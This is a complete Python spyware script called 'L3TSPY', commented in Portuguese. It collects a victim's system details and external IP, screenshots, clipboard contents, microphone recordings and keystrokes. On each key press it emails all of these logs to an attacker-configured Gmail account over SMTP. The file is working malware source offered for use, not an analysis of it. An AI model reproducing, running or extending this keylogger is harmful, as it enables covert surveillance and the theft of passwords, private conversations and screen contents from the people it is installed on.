# --------------------------------------------------------------------------------------- #
#!/bin/env python3
# 
# By vida
# 
# L3TSPY tem as seguintes funcionalidades:
#   - Information Gathering     - getInformations()
#   - Screenshots Logger        - takeScreenshot()
#   - ClipBoard Logger          - getClipBoard()
#   - Audio Logger              - audioLogger()
#   - Key Logger                - keyLogger()
#
# Funções extras:
#   - Envia para o email        - sendEmail()
# 
# --------------------------------------------------------------------------------------- #

# Variáveis de controle
dir_path = "logs" + "/"                     # insira o diretorio aqui
keyLog = dir_path + "keys.txt"
screenLog = dir_path + "tela.jpg"
infoLog =  dir_path + "infos.txt"
clipboardLog = dir_path + "clipBoard.txt"
audioLog = dir_path + "audio.wav"
recordingAudioTime = 10                     # insira o tempo de gravação aqui
email_to_send = "sender@gmail.com"          # insira o email que ira mandar os logs
password_for_sender = "senha123"            # insira a senha do email que ira mandar os logs
email_to_receive = "receiver@gmail.com"     # insira o email para receber os logs


# import libs for send to email
import multiprocessing
import smtplib, email.message, ssl
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
import mimetypes
from email import encoders
import getpass, platform

date = datetime.now()
dateFormatted = date.strftime('%d/%m/%Y às %H:%M:%S')
def sendEmail(infoFile, screenFile, clipboardFile, audioFile, keyFile):
    
    msg = MIMEMultipart()

    currentUser = getpass.getuser()
    SO = platform.system()
    SORelease = platform.release()

    body = f"""
        User: {currentUser}
        Sistema Operacional: {SO} {SORelease}
    """
    msg.attach(MIMEText(body, 'plain'))

    msg['From'] = email_to_send
    msg['To'] = email_to_receive
    msg['Subject'] = "Log = {}".format(dateFormatted)

    for file in infoFile, screenFile, clipboardFile, audioFile, keyFile:
        anexo = mimetypes.guess_type(file)[0].split('/')
        msg.add_header('Content-Disposition', 'attachment', filename=file)
        try:
            with open(file, 'rb') as log_file:
                log = MIMEBase(anexo[0], anexo[1], name=file)
                log.set_payload(log_file.read())
                encoders.encode_base64(log)
            msg.attach(log)
        except FileNotFoundError:
            with open(file, 'a') as logEmpty:
                    logEmpty.write("")

    useSSL = ssl.create_default_context()
    with smtplib.SMTP('smtp.gmail.com', 587) as sender:
        sender.starttls(context=useSSL) # Definindo ssl como criptografia principal
        sender.login(email_to_send, password_for_sender)
        sender.sendmail(email_to_send, email_to_receive, msg.as_string())

# import libs for screenshots logger
from datetime import date
import pyscreenshot as ImageGrab
def takeScreenshot():
	printScr = ImageGrab.grab()
	printScr.save(screenLog)
takeScreenshot()

# import libs for get informations
import socket
from requests import get
def getInformations():
    with open(infoLog, 'a') as log:
        try:
            ip_externo = get("https://api.ipify.org").text
            log.write("IP Externo:" + ip_externo + "\n")
        except Exception:
            log.write("Não foi possível pegar o IP Público")
        
        hostname = socket.gethostname()
        log.write("IP Interno: " + socket.gethostbyname(hostname) + "\n" )
        log.write("Usuario: " + getpass.getuser() + "\n")
        log.write("Hostname: " + hostname + "\n" )
        log.write("Sistema Operacional: " + platform.system() + platform.release() + "\n")
        log.write("Processador: " + platform.processor() + "\n")
        log.write("Arquitetura: " + platform.machine() + "\n")
getInformations()

# import libs for clipboard logger
import clipboard
def getClipBoard():
    with open(clipboardLog, 'a') as clip:
        try:
           clip.write("ClipBoard: " + clipboard.paste() + "\n")
        except:
            clip.write("ClipBoard: Não  foi possível pegar a área de transferência" )
getClipBoard()

# import libs for audio logger
import sounddevice as sd
from scipy.io.wavfile import write 
def audioLogger():
    hz = 44100
    time_seconds = recordingAudioTime

    recording = sd.rec(int(time_seconds * hz), samplerate=hz, channels=2)

    sd.wait()

    write(audioLog, hz, recording)
audioLogger()


# import libs for key logger
from mss import screenshot
from pynput.keyboard import Listener
from collections import deque
import threading
import re

password_to_exit = ['v','1','d','4']
pass_keys = deque(maxlen=4)

logArr = list()
def listToString(a):    # convertendo a lista para string
    str = ""
    return (str.join(a))

def logger(key):
    key = str(key).replace("'", "")
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.*', '', key)
    if key == "\n":
        logArr.append(key)
        with open(keyLog, 'a') as log:
            log.write(listToString(logArr))
            logArr.clear()
    else:
        logArr.append(key) 

    if "".join(password_to_exit) == "".join(pass_keys):
        return False

    # execução
    from multiprocessing import Process
    takeScreenshot()
    getClipBoard()
    audioLogger()
    multiprocessing.Process(target=sendEmail, args=(infoLog, screenLog, clipboardLog, audioLog, keyLog)).start()

    # removendo arquivos
    import os
    for file in os.listdir(dir_path):
        if file == clipboardLog or file == keyLog:
            path = dir_path+"/"+file
            with open(path, 'w') as log:
                log.flush()

while True:
    with Listener(on_press=logger) as L:
        L.join()
